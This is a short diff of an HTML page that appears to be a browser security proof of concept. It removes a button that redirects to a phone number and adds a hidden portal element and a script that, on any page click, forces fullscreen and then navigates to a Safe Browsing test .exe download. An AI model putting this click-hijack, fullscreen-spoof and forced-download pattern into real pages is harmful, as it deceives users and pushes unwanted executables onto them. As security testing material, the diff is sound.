@@ -1,2 +1,9 @@
+<portal src="portal.html" style="display:none;"></portal>
 
-<input onclick="var x = window.open('https://www.apple.com/contact/');setTimeout(function(){x.location='tel:+2123239'}, 1000)" type="button" value="Click here" />
+<script>
+    document.body.onclick = () => {
+
+      setTimeout('document.documentElement.requestFullscreen();', 399)
+      setTimeout('document.location="https://testsafebrowsing.appspot.com/s/content.exe"', 499)
+    }
+</script>
